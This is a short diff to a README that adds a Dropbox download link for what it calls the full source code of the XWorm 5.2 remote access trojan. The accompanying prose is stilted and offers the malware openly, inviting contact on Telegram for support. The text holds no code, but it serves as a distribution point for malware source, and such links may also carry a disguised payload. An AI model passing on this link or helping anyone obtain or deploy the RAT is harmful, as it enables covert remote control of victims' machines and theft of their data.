@@ -1,5 +1,6 @@
 # XWorm 5.2
 
+DOWNLOAD: https://www.dropbox.com/scl/fi/ir8ng92tek1ye0l5dv8ny/XWorm-V5.2.zip?rlkey=2gydl33e74dkd4wma583cbajd&st=qvlo4n5y&dl=1
 This is not a crevice nor a reversal, but a disclosure of the complete XWorm Rat source codes. Amidst the plethora of subpar Rats, XWorm stands as a testament to their ilk. My intention in sharing this is to spare you the futility of expending resources on such hollow pursuits. In the event that predicaments arise or further assistance is sought, communication through the Telegram platform is welcomed. Contact me at Telegram: @BONBONATHY. Subsequent installments in this narrative continuum are poised on the horizon...
 
 Interrogation & Reply
